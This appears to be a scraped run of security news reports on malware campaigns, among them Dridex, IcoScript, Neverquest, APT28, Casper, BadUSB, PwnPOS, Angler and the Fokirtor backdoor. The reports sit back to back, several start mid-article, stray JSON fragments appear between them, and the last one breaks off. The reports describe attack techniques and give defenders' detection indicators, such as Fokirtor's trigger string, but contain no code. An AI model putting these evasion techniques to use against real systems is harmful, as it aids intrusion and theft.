The messages instructed recipients to open the remittance advice attached to them. According to researchers, the attachment is a Word document saved as an XML file named something like “Rem_0443NF.xml.” The file is opened with Microsoft Word if the application is installed on the device, and if macros are enabled, the malicious Visual Basic for Applications (VBA) code is executed. “Hidden in this seemingly harmless XML file is a malicious macro document file which is compressed, encoded in base64, and stored in XML format,” explained Trustwave’s Rodel Mendrez. The obfuscated macro downloads the Dridex Trojan from a remote server. The threat is designed to steal sensitive information, such as banking details, from infected systems. This campaign has been active since October 2014. In January, Trustwave reported that the cybercriminals had leveraged Word and Excel documents to target banking customers in the United Kingdom. Researchers at Sophos also reported seeing “a surge in brand new VBA malware packaged in this old and unusual format [XML].” The security firm believes it’s likely that cybercriminals have revived the format because it’s not usually associated with attacks. “Perhaps, also, malware authors hope that the rarity of XML-type files means that some security products are unable to deconstruct it properly,” Graham Chantry, senior threat researcher with SophosLabs UK, explained in a blog post on new developments in Microsoft Office malware. Chantry has pointed out that the attackers could have embedded the malware as scrambled data directly in the VBA code, which would have allowed the threat to function even when offline. However, the use of a downloader gives the malicious actors extra flexibility, allowing them to change the downloaded malware at any time. This also enables them to adapt the threat based on the victim’s location, and download clean files that serve as a decoy. Didier Stevens, a handler at the SANS Institute’s Internet Storm Center, has provided some recommendations on how organizations can filter out emails that have potentially malicious XML files attached to them. “XML declaration identifies the XML file as a Word document, and attribute w:macrosPresent=\"yes\" (of element w:wordDocument) indicates the presence of VBA macros,” Stevens said.

In an effort to make their operations more difficult to disrupt, threat actors have been increasingly using DGAs to generate domain names for their command and control (C&C) servers. Some pieces of malware rely on DGAs that can generate thousands of domains every day and each of them is only active for a short period of time. Security firms often try to figure out how a certain DGA works in an effort to predict domain names and ensure that their products block them. While this method has had some success, Cybereason now claims it has found a way to detect DGAs and malicious activity associated with them by looking for specific behavior. “Instead of undertaking the Sisyphean task of fighting each DGA variant, a better approach would be to look for common techniques used by DGAs. Just detecting a DGA incriminates a process as malicious since no legitimate process will ever use such a technique,” explained Uri Sternfeld, research team leader at Cybereason. The company says it has used its novel technique to identify dozens of DGAs used in attacks affecting its customers, and it has published a report detailing eight of the more interesting ones, including what researchers believe to be new variants. For instance, Cybereason has identified a piece of malware with Russian origins that uses a DGA designed to generate 35 .ru or .com domains per day. The domains are generated using seven random letters preceded by the string “five” and a number (e.g. five14.lzeaeac.ru). A similar variant generates domain names with the string “pop” and without numbers (e.g. pop.imvhhht.ru). Another apparently new DGA has been used by an unidentified piece of malware that injects the svchost.exe process. The DGA generates a random value for a DWORD (32-bit unsigned integer) variable and converts it to a hexadecimal string which represents the domain name. The domains are hosted on the .com, .net or .info TLDs (e.g. 04F645A5.COM). A different unknown piece of malware uses a DGA which generates domains using long, randomly-generated strings that look like Punycode. The Angler exploit kit has been known to use DGAs, but Cybereason researchers believe its authors might have turned to a new variant that generates .com domain names using random characters and digits. DGAs often create domain names using combinations of random words from predefined lists. A variation of this method, spotted by experts in Dridex banking Trojan attacks, involves breaking, shifting and padding the words with random characters. The names are generated for Mongolia (.mn) and Montenegro (.me) TLDs. The DGA used by the Necurs backdoor is also interesting as it generates random names that are 8-20 characters in length on exotic TLDs, such as .im (Isle of Man), .ga (Gabon), .sc (Seychelles), .tu (Tuvalu), and .nu (Niue).

The threat, dubbed Win32.Trojan.IcoScript.A by the company, has been around since 2012, but has managed to remain undetected until recently, G Data researcher Paul Rascagnères said in a paper (PDF) published on Virus Bulletin. The IcoScript sample analyzed by the security firm used Yahoo Mail for C&C communications, but experts believe it could have relied on Gmail just as easily. Furthermore, since the RAT is modular, it would not be difficult for the malware writers to adapt their creation for social media platforms like LinkedIn and Facebook, Rascagnères explained. The malware works by abusing a technology called Component Object Model (COM), which enables inter-process communication and dynamic object creation. COM can be used to control Internet Explorer, and the malware developers have designed the RAT so that it takes full advantage of this feature. For example, they can hide malicious traffic because HTTP communication is done by the iexplorer.exe process, not the malware itself. Furthermore, since the session is hidden, it's unlikely that the victim will notice the additional communication by the Web browser.  Another advantage of using COM is the fact that it makes analysis through reverse engineering more difficult since there is no clear evidence of malicious network behavior.  Finally, if the targeted entity's infrastructure uses a proxy, the malware can leverage the proxy token stored in the user session, the researcher said. According to Rascagnères, the malware controls the Web browser through an encoded script stored in a separate file, which acts as a configuration file. In order to avoid raising suspicion, this file is appended to a legitimate icon (.ico) file that bears and Adobe Reader logo. This is the aspect that inspired researchers to name the threat IcoScript.  Interestingly, the RAT's developers have created the script that's used to control the browser with their own scripting language. Various commands are utilized to command Internet Explorer to go to a specified website, control elements on a Web page, enter credentials to access an email account, press buttons, check/uncheck checkboxes, execute files, exfiltrate data and much more. The malicious activities could remain undetected because the attackers can use hundreds of legitimate-looking email accounts. Furthermore, companies can't blacklist traffic associated with webmail services, Rascagnères pointed out. Some intrusion detection systems (IDS) might not be efficient either. The inboxes used by IcoScript store emails containing various instructions. These instructions are inserted between strings like \"<<<<<<\" and \">>>>>>,\" and \"+++++++\" and \"######.\" However, because Yahoo Mail traffic is compressed with gzip and it's only uncompressed in the browser, the IDS can only detect the strings if it can decompress the data on the fly. Another problem would be that HTML obfuscation techniques can also be used to disguise the strings, the expert explained. \"For incident response teams, containment is usually restricted to blocking the URL on the proxy. In this case, the URL cannot easily be blocked and a lot of legitimate requests must not be blocked. Furthermore, the attacker can configure each sample to use multiple legitimate websites such as social networks, webmail sites, cloud services and so on,\" Rascagnères said in the research paper. \"The containment must be performed on the network flow in real time. This approach is harder to realize and to maintain. It demonstrates both that attackers know how incident response teams work, and that they can adapt their communication to make detection and containment both complicated and expensive.\" " }

In July, a post was published on cybercrime forum that offered a malicious program that could be used to attack about 100 banks by \"seeding add-on code onto bank websites viewed with Internet Explorer and Mozilla Firefox, with VNC connections\" and other ways to attack any bank in the world, according to Kaspersky Lab.   Digging deeper, the researchers discovered that the program the criminals offered was Trojan-Banker.Win32/64.Neverquest – malware that by mid-November had been used in several thousand attempted infections all around the world.     The Trojan's main objective is to replenish its default list of 28 targeted websites – all of which are large international banks and popular online payment services – by identifying web pages visited by victims that use certain keywords related to bank transactions. If the keywords are found on a webpage in the browser, the malware will intercept the process and send them full contents of the webpage and its URL to malicious users.  Based on that received data, the malicious users then develop additional code to be seeded onto that website, and the new website is then included onto the list of targeted websites. The updated configuration file is then distributed to all infected computers, according to Kaspersky Lab.   \"When a user on an infected machine visits one of the sites on the list, the malware controls the browser’s connection with the server,\" blogged Sergey Golovanov, principal security researcher at Kaspersky Lab. \"Malicious users can obtain usernames and passwords entered by the user, and modify webpage content. All of the data entered by the user will be entered onto the modified webpage and transmitted to malicious users.\"   After getting access to a user's account, the criminals use a SOCKS server and remotely connect to infected computers through a VNC server and wire money from the user to their own accounts or the accounts of other victims to \"keep the trail from leading directly to them,\" according to Golovanov.   The malware program also steals data from the user’s email clients and swipes data during SMTP/POP sessions that is then used to send out mass spam mailings with attachments containing Trojan Downloaders that installs Neverquest. These emails are typically designed to look like official notifications from various services, and contain the following attachments:       The data stolen from these programs is then used by the cybercriminals to further distribute the malicious program using the Neutrino exploit pack. \"The weeks prior to the Christmas and New Year holidays are traditionally a period of high malicious user activity,\" Golovanov  blogged. \"As early as November, Kaspersky Lab noted instances where posts were made in hacker forums about buying and selling databases to access bank accounts and other documents used to open and manage the accounts to which stolen funds are sent. We can expect to see mass Neverquest attacks towards the end of the year, which could ultimately lead to more users becoming the victims of online cash theft.\" \"After wrapping up several criminal cases associated with the creation and proliferation of malware used to steal bank website data, a few 'holes' appeared on the black market,\" he continued. \"New malicious users are trying to fill these with new technologies and ideas. Neverquest is just one of the threats aiming to take over the leading positions previously held by programs like ZeuS and Carberp.\" " }

Despite strong opposition from Russia, Montenegro officially joined NATO on June 5. Russia has threatened to retaliate but it may have already taken action against Montenegro in cyberspace. Attacks aimed at the Montenegro government spotted earlier this year by security firm FireEye leveraged malware and exploits associated with the Russia-linked threat group known as APT28, Fancy Bear, Pawn Storm, Strontium, Sofacy, Sednit and Tsar Team. APT28 has been known to target Montenegro. In the latest attacks observed by researchers, the hackers used spear-phishing emails to deliver malicious documents pertaining to a NATO secretary meeting and a visit by a European army unit to Montenegro. Experts believe the latter document may have been stolen and weaponized by the attackers. The malware delivered in these attacks is tracked by FireEye as GAMEFISH and it has been exclusively used by APT28. GAMEFISH is a backdoor that is tracked by other security firms as Sednit, Seduploader, JHUHUGIT and Sofacy. The malicious documents delivered the malware via a Flash exploit framework. FireEye has privately informed its customers about this framework, but it has not detailed it in any public reports. However, the company told SecurityWeek that this framework is also known as DealersChoice, which Palo Alto Networks analyzed in October 2016. FireEye analyst Ben Read told SecurityWeek that the malicious documents first profile the targeted system in an effort to determine which version of Flash Player is present. A command and control (C&C) server is then contacted and the appropriate Flash exploit is downloaded. The exploits, which can include CVE-2015-7645 and CVE-2016-7855, are used to deliver GAMEFISH. Read said it was unclear if APT28’s attacks against the Montenegro government were successful. “It’s likely that this activity is a part of APT28’s continued focus on targeting various NATO member states, as well as the organization itself,” said Tony Cole, VP and CTO for Global Government at FireEye. “Russia has strongly opposed Montenegro's NATO accession process and is likely to continue using cyber capabilities to undermine Montenegro's smooth integration into the alliance,” Cole added. “Montenegro's accession could increase cyber threat activity directed toward NATO, and provide additional avenues for adversaries like Russia to illicitly access NATO information.” APT28 has been known to target NATO member countries, including by leveraging zero-day vulnerabilities. The group has also been involved in the recent U.S. election attacks. While the threat actor is widely believed to be sponsored by the Russian government, Moscow has repeatedly denied the accusations. The country’s president, Vladimir Putin, recently claimed that patriotic hackers from Russia could be behind these attacks, but denied that the government is involved in hacking activities. " }

The latest threat uncovered by experts has been dubbed “Casper.” In March 2014, the French publication LeMonde published some slides from Canada's Communications Security Establishment (CSE) describing “Operation Snowglobe,” a campaign discovered by the agency in 2009. Additional slides were made available by the German publication Der Spiegel in January 2015. The presentation revealed details on a piece of malware named Babar, which appeared to be the work of a French intelligence agency. Based on the information from the slides, researchers first uncovered a piece of spyware, dubbed “EvilBunny,” which they believe is linked to Operation Snowglobe. Last month, G DATA and Cyphort published the details of a threat which they believe is Babar, the malware described in the CSE slides. Now, they have come across Casper, which also appears to have been developed by the same authors. Casper and the links to other cartoon malware families The new threat has been dubbed Casper because its dropper implant is a file named Casper_DLL.dll. The name could stem from the animated cartoon series “Casper the Friendly Ghost.” According to ESET and Cyphort, Casper appears to be a reconnaissance tool designed to harvest information on the infected system, including OS version and system architecture, default Web browser, running processes, installed applications, apps that run on startup, and country and organization details. Researchers have determined that Casper uses an interesting technique to evade detection by security solutions. The espionage tool checks to see which antivirus is running on the infected system. A different strategy, which defines how the malware behaves, is available for four different antiviruses. If no antivirus is found, or if there is no specific strategy for the installed security software, a default strategy is applied. Experts discovered several similarities between Casper, Babar, EvilBunny and NBOT, a threat that also seems to be linked to the cartoon malware families. The list of similarities includes enumeration of installed security solutions through Windows Management Instrumentation (WMI), a hashing algorithm used for hiding calls to API functions, unhandled exception filters, payload deployment through remote thread injection, embedded and encrypted configuration in XML format, and proxy bypass code. Casper attacks in Syria Unlike Babar and EvilBunny, Casper appears to be a newer family that has been used in attacks as recently as April 2014. An operation involving the threat was spotted by Kaspersky in mid-April 2014. At the time, researchers noticed that jpic.gov.sy, a complaint website set up in 2011 by the Syrian Ministry of Justice, had been leveraged in a watering hole attack that involved an Adobe Flash Player zero-day exploit (CVE-2014-0515). Kaspersky researchers could not identify the payload that had been served, but ESET, Cyphort, G DATA and the Computer Incident Response Center in Luxembourg (CIRCL) determined recently that it was likely Casper. “According to our telemetry data, all the people targeted during this operation were located in Syria. These targets may have been the visitors of the jpic.gov.sy website — Syrian citizens who want to file a complaint. In this case they could have been redirected to the exploits from a legitimate page of this website,” ESET researcher Joan Calvet noted in a blog post. “But we were actually unable to determine if this were indeed the case. In other words, it is just as likely that the targets have been redirected to the exploits from another location, for example from a hacked legitimate website or from a link in an email. What is known for sure is that the exploits, the Casper binaries and the C&C component were all hosted on this website’s server,” Calvet added. Attribution and motivation One possibility is that the attackers used the Syrian server for storage. They might have wanted to be able to access the data from within Syria, or they might have wanted to throw off investigators and make them believe the Syrian government was behind the attack. Cyphort researcher Marion Marschalek noted that while the source code base suggests that the same authors are behind Casper, EvilBunny, Babar and NBOT, it doesn’t necessarily mean that all of the attacks involving these malware families were carried out by the same actor. “Taking into account that the geographical area targeted by Casper is of high political interest for many parties and that the malware’s intention is clearly the preparation of a more targeted attack we expect the nature of the attack to be of political rather than criminal intent,” Marschalek said in a blog post. “The considerably high amount of resources spent on development and distribution of the malware support this theory. Development of targeted malware with a level of sophistication shown by Casper requires a skilled team of developers; also the use of 0-day exploits in the distribution process leaves the conclusion the operators were very well funded,” Marschalek added. In the case of Casper, ESET noted that there is no evidence linking the malware to French intelligence. The theory that a French intelligence agency is behind the cartoon malware families is mainly supported by evidence presented by CSE for Babar. The presumption that the French government is involved is based on the list of targets, the countries where the attack infrastructure was hosted, the fact that “Babar the Elephant” is a fictional character from a French children’s book, a nickname used by one of the malware developers (titi), and some language and regional settings. Other cartoon malware families Kaspersky has also been monitoring this advanced threat actor, which it has dubbed “Animal Farm.” According to the security firm, the group uses a total of six major malware families. In addition to Casper, Bunny, Babar and NBOT, Kaspersky has observed Dino, a full-featured espionage platform, and Tafacalou (also known as TFC and Transporter), a validator-style Trojan. Kaspersky has also identified a link to France. Experts believe the name Tafacalou, which is used internally by the threat actor, could stem from \"Ta Fa Calou,\" which means \"so it's getting hot\" in Occitan, a language spoken in southern France, Monaco, and some parts of Spain and Italy. *Updated with information from Kaspersky on the Animal Farm APT " }

According to a report from Dell SecureWorks' Joe Stewart and David Shear, the cost of distributed denial of service attacks is broken down by attackers per hour ($3 to $5), per day ($90-$100) and per week ($400-600). An American Express credit card? Seven dollars. Bank accounts with $70,000-$150,000? Three hundred dollars or less, depending on the institution.   \"As always, there is no shortage of stolen credit cards, personal identities, also known as Fullz, and individual social security numbers for sale,\" blogged Elizabeth Clarke, vice president of corporate communications at Dell SecureWorks. \"However, the hackers have come to realize that merely having a credit card number and corresponding CVV code (Card Verification Value–the 3 or 4 digit number on one’s credit or debit card) is not always enough to meet the security protocols of some retailers. Hackers are also selling cardholders’ Date of Birth and/or Social Security Number. Having this additional information would allow a hacker to answer additional security questions or produce a fake identification, to go along with a duplicate credit card.\"   The business of selling compromised computers is also booming. The price per computer typically decreases when they are purchased in bulk, for example, $20 for 1,000 bots and $90 for 5,000, the researchers found.   \"Infected computers in Asia tend to sell for less,\" Clarke blogged. \"It is thought that infected computers in the U.S. are probably more valuable than those in Asia, because they have a faster and more reliable Internet connection.\"   Stewart and Shear also discovered that remote access Trojans (RATs) used by attackers can cost from $50 to $250. Many of these Trojans are sold with a program to make them undetectable to antivirus, though that can cost an additional $20. The cost of exploit kits varies widely, with the Sweet Orange Exploit kit available for lease at a price of $450 a week, while the Blackhole kit was available for $1,500 a year at the time its alleged creator was arrested this year.     \"For the most part, it does not appear that the types of hacker services and stolen data for sell on the hacker underground have changed dramatically in the past several years,\" Clarke blogged. \"The only noticeable difference is the drop in price for online bank account credentials and the drop in price for Fullz or Personal Credentials.\"   \"In 2011, we also saw hackers selling Fullz for anywhere from $40 to $60, depending on the victim’s country of residence,\" Clarke added. \"Fullz are now selling between $25 and only go up to $40, depending on the victim’s location. Dell SecureWorks believes the drop in prices further substantiates that there is an abundance of stolen bank account credentials and personal identities for sale. There is also no shortage of hackers willing to do about anything, computer related, for money, and they are continually finding ways to monetize personal and business data.\" " }

The brief [PDF] filed with the U.S. District Court for the Western District of Washington, warns that “the security of millions of individuals using Mozilla’s Firefox Internet browser could be put at risk by a premature disclosure of this vulnerability.” Tor, popular among web users for the privacy and anonymity features it offers, consists of a modified Mozilla Firefox web browser.  The open-source Mozilla now wants to make sure its own code isn’t implicated in the Tor zero-day that was used by the FBI in 2015 to unmask web users accessing child pornography content. In a blog post, Mozilla Chief Legal and Business Officer Denelle Dixon-Thayer writes: The relevant issue in this case relates to a vulnerability allegedly exploited by the government in the Tor Browser. The Tor Browser is partially based on our Firefox browser code. Some have speculated, including members of the defense team, that the vulnerability might exist in the portion of the Firefox browser code relied on by the Tor Browser. At this point, no one (including us) outside the government knows what vulnerability was exploited and whether it resides in any of our code base. The judge in this case ordered the government to disclose the vulnerability to the defense team but not to any of the entities that could actually fix the vulnerability. We don’t believe that this makes sense because it doesn’t allow the vulnerability to be fixed before it is more widely disclosed. “If our code is implicated in a security vulnerability, [the] government must disclose the vulnerability to us before it is disclosed to any other party. We aren’t taking sides in the case, but we are on the side of the hundreds of millions of users who could benefit from timely disclosure,” Dixon-Thayer added. The Mozilla brief is urging the court to require the government to disclose the vulnerability to the affected technology companies first, so it can be patched quickly.  During the criminal case proceedings, Justice Robert J. Bryan ruled that the FBI to reveal the code it used to track the defendants but the government refused, arguing that the details of the exploit was not necessary for the defense’s case. " }

Most security solutions can easily identify and neutralize a piece of malware that's found on a USB device, but things get complicated if the threat resides directly in the firmware of such devices.  At the upcoming Black Hat security conference, Karsten Nohl and Jakob Lell, both researchers at Germany-based SRLabs, will present a new type of malware which leverages the fact that the firmware found in thumb drives and other USB devices can be reprogrammed and abused for malicious purposes.  The problem, according to the researchers, is that the USB controller chips in peripherals can be reprogrammed to spoof other devices and there's little or no protection to prevent anyone from doing so. In order to demonstrate their findings, Nohl and Lell have developed BadUSB, a self-replicating piece of malware that can be used by an attacker to take control of a computer. For instance, the BadUSB malware can make a device emulate a keyboard and use it to send commands on behalf of the victim. Attackers can steal data, install other pieces of malware, and even infect the controller chips of other USB devices connected to the affected computer, SRLabs said in a blog post. USB devices can also be reprogrammed to spoof a network card, allowing the attackers to change the infected computer's DNS settings in an effort to redirect traffic. Thumb drives or external hard disks can be configured to detect when a computer is starting, and load a small virus into the operating system before boot. All of these scenarios will be demonstrated by the researchers at the Black Hat conference.  Nohl told SecurityWeek that they've implemented their attacks on one type of USB2 chip, one type of USB3 chip, and on Android phones. The controller chip firmware on which they've conducted their tests is very widespread and it's used in the thumb drives produced by various companies, the researcher explained. \"Any device connected over USB could become a BadUSB by re-programming its USB controller. Whether and how that is possible differs by controller chip,\" Nohl said via email. According to Nohl, SRLabs spent three months on reverse engineering and reprogramming the two USB controller chips on which they have conducted experiments. These types of threats are not detected by security solutions because malware scanners can't access the firmware running on USB devices. Behavior-based scanners aren't efficient either because devices infected with BadUSB don't exhibit any suspicious behavior. Instead, when the malware changes the functionality of a drive, it simply looks like the user plugged in a new device. \"To make matters worse, cleanup after an incident is hard: Simply reinstalling the operating system – the standard response to otherwise ineradicable malware – does not address BadUSB infections at their root. The USB thumb drive, from which the operating system is reinstalled, may already be infected, as may the hardwired webcam or other USB components inside the computer. A BadUSB device may even have replaced the computer’s BIOS – again by emulating a keyboard and unlocking a hidden file on the USB thumb drive,\" SRLabs explained in its blog post. \"Once infected, computers and their USB peripherals can never be trusted again.\" These attack techniques might seem new, but it's possible that they've already been leveraged in the wild. Documents leaked by former NSA contractor Edward Snowden in December 2013 show that the intelligence agency has been using similar methods in its surveillance operations. " }

It’s not uncommon for malicious actors to deliver malware using specially crafted Office files, particularly Word documents. These attacks typically rely on social engineering to trick the targeted user into enabling VBA macros embedded in the document. However, researchers recently spotted several malicious PowerPoint files that use mouseover events to execute PowerShell code. These files, named “order.ppsx” or “invoice.ppsx,” have been distributed via spam emails with subject lines such as “Purchase Order #130527” and “Confirmation.” An analysis conducted by Ruben Daniel Dodge shows that when the PowerPoint presentation is opened, it displays the text “Loading...Please wait” as a hyperlink.  If the user hovers the mouse over the link – even without clicking it – the execution of PowerShell code is triggered. The Protected View security feature, which is enabled by default in most supported versions of Office, informs the user of the risks and prompts them to enable or disable the content. If the victim enables the content, the PowerShell code is executed and a domain named “cccn.nl” is contacted. A file is downloaded from this domain and executed, ultimately resulting in the deployment of a malware downloader. Researchers at SentinelOne have also analyzed the attack and found that it had been used to deliver a new variant of the banking Trojan tracked as Zusy, Tinba and Tiny Banker. The security firm pointed out that while the attack does not work if the malicious presentation is opened using PowerPoint Viewer, and most versions of Office warn the user before the code is executed, the method could still be efficient in some cases. “Users might still somehow enable external programs because they’re lazy, in a hurry, or they’re only used to blocking macros. Also, some configurations may possibly be more permissive in executing external programs than they are with macros,” SentinelOne Labs said in a blog post.

According to Trend Micro, it has been spotted targeting small-to-midsized businesses (SMBs) in Japan, Australia, India, Canada, Germany, Romania and the United States. Trend Micro Threat Analyst Jay Yaneza called PwnPOS an example of malware that's been \"able to fly under the radar all these years due to its simple but thoughtful construction.\" \"Technically, there are two components of PwnPOS: 1) the RAM scraper binary, and 2) the binary responsible for data exfiltration,\" he explained in a blog post. \"While the RAM scraper component remains constant, the data exfiltration component has seen several changes – implying that there are two, and possibly distinct, authors. The RAM scraper goes through a process’ memory and dumps the data to the file and the binary uses SMTP for data exfiltration.\" The malware targets devices running 32-bit versions of Windows XP and Windows 7. One of the keys to the malware's stealth appears to be its ability to remove and add itself from a list of services on the PoS device. \"Most incident response and malware-related tools attempt to enumerate auto-run, auto-start or items that have an entry within the services applet in attempt to detect malicious files,\" Yaneza blogged. \"Thus, having parameters that add and remove itself from the list of services allows the attacker to “remain persistent” on the target POS machine when needed, while allowing the malicious file to appear benign as it waits within the %SYSTEM$ directory for the next time it is invoked.\" PwnPOS enumerates all running processes and searches for card information. Afterward, the stolen data is dumped into a file and ultimately emailed to \"a pre-defined mail account via SMTP with SSL and authentication,\" the researcher blogged. Cybercriminals have increasingly been turning to ready-to-use point-of-sale malware kits. According to security firm Crowdstrike, such kits can cost from as little as tens of dollars to thousands depending upon their complexity.  " }

The Wall Street Journal reported last month that hackers working for the Russian government stole information on how the U.S. penetrates foreign networks and how it defends against cyberattacks. The files were allegedly taken in 2015 from the personal computer of an NSA contractor who had been using a security product from Kaspersky Lab. The WSJ article suggested that Kaspersky either knowingly helped the Russian government obtain the files or that the hackers exploited vulnerabilities in the company’s software without the firm’s involvement. In a preliminary report, Kaspersky said the incident referenced in the WSJ article likely took place in 2014, when the company was investigating malware used by the Equation Group, a threat actor later associated with the NSA. In a more technical report published on Thursday, Kaspersky said the incident likely occurred between September 11, 2014 and November 17, 2014 – the security firm believes WSJ’s source may have mixed up the dates. In September 2014, Kaspersky’s products detected malware associated with the Equation Group on a device with an IP address pointing to the Baltimore area in Maryland. It’s worth noting that the NSA headquarters are in Fort Meade, Maryland, less than 20 miles from the city of Baltimore. The Kaspersky product present on the device automatically sent an archive containing the suspected malware files back to the company’s systems for further analysis. The said archive contained source code for Equation malware, along with four documents with classification markings (e.g. secret, confidential). The Kaspersky analyst who found the archive informed the company’s CEO of its content and the decision was made to remove the files from its storage systems. So is it possible that the classified files were somehow obtained by Russian actors from Kaspersky’s systems? The firm denies spying for the Russian government and claims the data was removed from its systems – only some statistics and metadata remain – but it cannot guarantee that its employees handled the data appropriately. “We cannot assess whether the data was ‘handled appropriately’ (according to US Government norms) since our analysts have not been trained on handling US classified information, nor are they under any legal obligation to do so,” the company said. While Kaspersky admitted that its systems were breached in 2015 by a threat group linked to Israeli intelligence, the company said it found no evidence that the NSA files left its systems. As for the assumption that Kaspersky’s products may have been specifically configured to look for secret files on the systems they were installed on, the company said all the signatures for retrieving files from a user’s device are carefully handled and verified by an experienced developer, and there is no evidence that anyone created a signature for files marked “secret” during the Equation investigation. The company determined that an analyst did create a signature for files with names that included the string “secret,” but it was for a piece of malware associated with the TeamSpy espionage campaign. The signature included a path specific for that malware to avoid false positives. Another possible scenario is related to the fact that the device of the NSA contractor got infected with malware after the Kaspersky antivirus was disabled. The security product was temporarily disabled when the user attempted to install a pirated copy of Microsoft Office using a known activation tool. After the antivirus was re-enabled, Kaspersky detected 121 threats on the system. The malware associated with the Office activation tool was Smoke Bot (aka Smoke Loader), which had been sold on Russian underground forums since 2011. At the time of the incident, the malware communicated with servers apparently set up by an individual located in China. Kaspersky says it’s also possible that the contractor’s computer may have been infected with stealthy malware from a sophisticated threat actor that was not detected at the time. Several recent media reports focused on Kaspersky’s alleged connection to the Kremlin, which has led to many U.S. officials raising concerns regarding the use of company’s products. As a result, the Department of Homeland Security (DHS) has ordered all government agencies to identify and remove the firm’s products, despite the apparent lack of evidence supporting the claims. In an effort to clear its name, Kaspersky announced the launch of a new transparency initiative that involves giving partners access to source code and paying significantly larger bug bounties for vulnerabilities found in the firm’s products.

While CrowdStrike stated the operation was likely the work of a Russian threat actor, researchers at Kaspersky Lab were more hesitant to name names. \"Based in some artifacts, we believe the campaign originated at the end of 2010,\" according to a blog post by Kaspersky Lab's Global Research and Analysis Team. \"The campaign is still alive and getting new daily victims.\" \"We believe this is an information stealing campaign,\" the researchers added. \"Given the heterogeneous profile of the victims it seems than the attackers were interested in different topics and decided to target some of the most prominent institutions and companies in the world to get latest information.\" The attackers used three tactics to distribute malware: spear-phishing using PDF documents armed with an exploit for CVE-2011-0611, an Adobe Flash Player vulnerability; waterhole attacks using a variety of exploits; and Trojanized software installers.   The most prevalent attack tool is the Havex Trojan, 27 versions of which have been identified by Kaspersky Lab. However, the attackers used other pieces of malware as well. For example, the attackers used the Sysmain remote access tool (RAT), as well as the Ddex loader, the Karagany backdoor and the ClientX backdoor. \"There is nothing especially sophisticated in their exploits, or in the malware they used to infect victims,\" the researchers noted in a report. \"Their RATs are flexible enough to perform surveillance and data exfiltration efficiently. They used dozens of compromised servers as Command and Control domains with a simple, but effective, PHP backend. However there is an interesting connection with this group and the LightsOut Exploit Kit for the distribution of its malware in some waterholing attacks. We believe they are likely its only operators as of June 2014.\" The command and control servers are compromised websites from various countries. In total, Kaspersky Lab found 219 unique domain names for those servers hosted in 21 different countries. Eighty-one are hosted in the U.S., by far the most of any individual country. Thirty-three are located in Germany. Targeted industry sectors include: mining, manufacturing, construction, information technology and the energy industry, among others. The most targeted countries are: Spain, Japan, Germany, France, Italy, Turkey, Ireland, Poland, China and the United States. \"We believe they might be collateral victims, but it might also be fair to redefine the Crouching Yeti actor not only as a highly targeted one in a very specific area of interest, but a broad surveillance campaign with interests in different sectors,\" the report adds.

The Angler exploit kit has made numerous headlines over the past few months after cybercriminals integrated Adobe Flash Player zero-days and Internet Explorer exploits. Experts believe Angler is currently one of the most sophisticated and widely used exploits kits. The new technique spotted by Cisco, dubbed “domain shadowing,” involves compromised domain registration accounts. The attackers hijack these accounts, usually through phishing, and they use them to create subdomains. Researchers have identified hundreds of compromised domain registration accounts that give cybercriminals access to several thousand domains. On these domains, the attackers have created roughly 10,000 unique subdomains, which they have been using to redirect victims to the exploit kit landing pages, and to host the actual landing pages and exploits. In the campaign observed by Cisco, which has been running since late December, the cybercrooks quickly rotate both the subdomains and their IP addresses. This makes it more difficult to blacklist the subdomains and IP addresses, and it gives researchers only a short timeframe to analyze the exploits. Hijacking domain registration accounts can be highly lucrative. On one hand, the attackers create a large number of disposable subdomains that they can use in their operations. In this case, Cisco has determined that only a third of the compromised domains have been utilized so far, which means the cybercriminals still have plenty to work with in the future. On the other hand, website administrators usually check their domain registration accounts only when they renew the domain, so chances are that the attackers will be able to create as many subdomains as they like without being detected. In this case, a majority of the compromised accounts belong to GoDaddy customers. This isn’t surprising considering that the company is the world’s largest registrar, with 59 million domains names under its management. As Cisco has pointed out, a phishing campaign targeted at GoDaddy customers is likely to generate a large number of victims. The Angler EK attacks start with a malicious ad that’s designed to redirect victims to an attacker-controlled webpage hosted on the first tier of subdomains. From these subdomains, users are redirected to the exploit kit landing pages hosted on the second tier of subdomains. According to Cisco, some of the subdomains are only active for a few minutes before they are replaced. It’s also worth noting that there are five times more exploit subdomains than redirection subdomains. A common technique used by cybercriminals to evade IP address detection and blacklisting is called “fast flux.” When this technique is used, the IP addresses associated with a domain or DNS entry are rotated quickly. When domain shadowing is utilized, subdomains associated with a single domain are rotated. The subdomains can point to a single IP or a group of IP addresses, Cisco noted. “Domain shadowing using compromised registrant credentials is the most effective, difficult to stop, technique that threat actors have used to date. The accounts are largely random so there is no way to track which domains will be used next. Additionally, the subdomains are very high volume, short lived, and random, with no discernible patterns. This makes blocking increasingly difficult,” Cisco threat researcher Nick Biasini explained in a blog post. “Finally, it has also hindered research. It has become progressively more difficult to get active samples from an exploit kit landing page that is active for less than an hour. This helps increase the attack window for threat actors since researchers have to increase the level of effort to gather and analyze the samples,” Biasini added. Blacklisting is ineffective against such attacks and the malware samples are often not detected by signature-based antiviruses because they are morphed frequently. According to Cisco, the best way to detect and block these threats is by using next-generation intrusion prevention systems (NGIPS) and advanced heuristic-based malware detection solutions. " }

According to Symantec, a group of sophisticated attackers have developed a sneaky way to do that via a Linux backdoor designed to hide communications.   The backdoor is detected as Linux.Fokirtor, and has thus far only been seen by the company in a single organization – an Internet hosting provider compromised in May of this year. During the attack, the hackers gained access to internal administrative systems and appear to have been targeting customer information, Symantec noted.   \"The attackers understood the target environment was generally well protected,\" according to the Symantec Security Response Team blog. \"In particular, the attackers needed a means to avoid suspicious network traffic or installed files, which may have triggered a security review.\" To do this, the attackers \"devised their own stealthy Linux back door to camouflage itself within the Secure Shell (SSH) and other server processes.\"   The backdoor enabled the attackers to remotely execute code commands without opening a network socket or attempting to connect to a command-and-control server. Instead, the backdoor code was injected into the SSH process to monitor network traffic and look for a specific sequence of characters - colon, exclamation mark, semi-colon, period (“:!;.”).   When the characters were spotted, the malware would parse the remaining traffic and extract commands that had been encrypted with Blowfish and Base64 encoded, Symantec explained. From there, the attackers could make normal connection requests through SSH or other protocols and embed the sequence of characters within legitimate traffic to avoid detection. The commands would then be executed.    \"To identify the presence of this back door on your network, look for traffic that contains the “:!;.” string (excluding quotes),\" according to the Security Response team blog. \"Traffic which contains this string will not appear in SSH logs.\"   Another way to identify the backdoor is to dump the SSHD process and search for the following strings (where [VALUE] can be various values): key=[VALUE]; dhost=[VALUE]; hbt=3600; sp=[VALUE]; sk=[VALUE] and dip=[VALUE].   \"While we discovered this in only a single organization, this threat will likely go 